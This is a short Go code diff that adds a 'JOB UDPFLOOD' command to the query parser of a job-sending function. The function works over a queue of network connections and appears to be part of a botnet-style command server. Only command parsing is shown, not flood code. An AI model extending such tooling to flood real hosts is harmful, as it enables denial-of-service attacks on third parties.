@@ -60,6 +60,8 @@ func jobSender(mutex *sync.Mutex, queue *[]net.Conn) {
 					smallQuery = query[:12]
 				} else if query[:10] == "JOB HOSTUP" {
 					smallQuery = query[:10]
+				} else if query[:12] == "JOB UDPFLOOD" {
+					smallQuery = query[:12]
 				} else {
 					fmt.Println("invalid query, please use proper protocol standards")
 					continue
